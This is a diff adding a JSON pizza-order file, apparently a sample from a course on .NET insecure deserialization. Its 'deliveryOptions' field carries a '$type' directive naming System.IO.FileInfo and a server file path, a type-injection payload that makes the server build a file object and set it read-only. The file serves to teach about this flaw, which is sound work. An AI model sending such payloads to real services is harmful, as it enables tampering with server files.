@@ -1,0 +1,14 @@
+{
+	"name": "David Berry",
+	"items": [
+		{
+			"itemName": "Large Combination Pizza",
+			"quantity": 2
+		}
+	],
+	"deliveryOptions": {
+		"$type": "System.IO.FileInfo, System.IO.FileSystem",
+		"fileName": "C:\\github\\pluralsight\\Deserialization\\InsecureDeserialization\\InsecureDeserialization\\wwwroot\\ImportantFile.txt",
+		"IsReadOnly": true
+	}
+}
